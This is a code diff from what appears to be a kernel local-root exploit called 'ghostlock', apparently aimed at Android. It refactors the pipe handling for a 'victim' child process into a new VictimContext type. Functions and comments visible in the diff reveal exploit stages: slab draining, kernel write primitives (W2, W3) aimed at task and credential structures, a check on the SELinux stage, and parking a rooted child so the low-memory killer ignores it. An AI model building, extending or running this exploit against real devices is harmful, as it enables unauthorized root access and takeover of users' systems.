@@ -9,6 +9,7 @@
 #include "routes/route_controller.h"
 #include "profile.h"
 #include "session/handoff_probe.hpp"
+#include "session/victim_context.hpp"
 #include "support/native_resource.hpp"
 #include <array>
 #include <ctype.h>
@@ -963,19 +964,6 @@ static uintptr_t perf_find_task(void) {
     return best;
 }
 
-/* Owns the six pipe ends of the victim protocol. The child-side ends are
- * closed by the fork child before child_main runs; the parent-side ends are
- * closed once their protocol step is done. parked_cmd_w below receives the
- * cmd write end by move when a rooted child is parked across W3 rounds. */
-struct child_pipes {
-    ghostlock::UniqueFd task_read;
-    ghostlock::UniqueFd cmd_write;
-    ghostlock::UniqueFd uid_read;
-    ghostlock::UniqueFd task_write;
-    ghostlock::UniqueFd cmd_read;
-    ghostlock::UniqueFd uid_write;
-};
-
 /* rooted exits kfree the static init_cred (w2 stores it with no
  * get_cred). park forever, oom_score_adj -1000 so lmkd skips us. */
 /* Decoupling plan: retain a rooted child that references the credential.
@@ -993,7 +981,7 @@ static void park_rooted_child(void) {
 /* Decoupling plan: execute the victim command protocol and root handoff.
  * Input: owned pipe endpoints plus runtime config; output: reports/child exit.
  * Future: victim_child_run(VictimContext *), with explicit fd ownership. */
-static void child_main(struct child_pipes *p) {
+static void child_main(ghostlock::VictimContext *p) {
     p->task_read.reset();
     p->cmd_write.reset();
     p->uid_read.reset();
@@ -1129,7 +1117,7 @@ static void child_main(struct child_pipes *p) {
 
 /* Decoupling plan: create the victim process and pipe protocol. Input/output:
  * VictimContext; output: owned PID/error. Future: victim_context_spawn(). */
-static pid_t spawn_child(struct child_pipes *p) {
+static pid_t spawn_child(ghostlock::VictimContext *p) {
     int p1[2], p2[2], p3[2];
     if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
     p->task_read.reset(p1[0]);
@@ -1154,7 +1142,7 @@ static pid_t spawn_child(struct child_pipes *p) {
 /* Decoupling plan: spawn a victim and obtain its task address. Inputs:
  * VictimContext/output address; output: PID/error. Future:
  * victim_context_prepare(VictimContext *, uintptr_t *). */
-static pid_t spawn_victim(struct child_pipes *p, uintptr_t *task_out) {
+static pid_t spawn_victim(ghostlock::VictimContext *p, uintptr_t *task_out) {
     pid_t child = spawn_child(p);
     if (child < 0) return -1;
     uintptr_t task = 0;
@@ -1256,11 +1244,11 @@ static int verify_selinux_stage(void *context) {
 }
 
 struct w2_stage_context {
-    struct child_pipes *pipes;
+    ghostlock::VictimContext *pipes;
 };
 
 struct w3_stage_context {
-    struct child_pipes *pipes;
+    ghostlock::VictimContext *pipes;
     int leaf_to_target8; /* 1: leaf write lands on [target+8], 0: [target] */
 };
 
@@ -1478,7 +1466,7 @@ int run_exploit(int argc, char **argv) {
     slab_drain();
     TIMER("pre-W2 drain");
 
-    struct child_pipes pipes;
+    ghostlock::VictimContext pipes;
     struct w2_stage_context w2_context = {.pipes = &pipes};
     pid_t child = -1;
     uintptr_t child_task = 0;
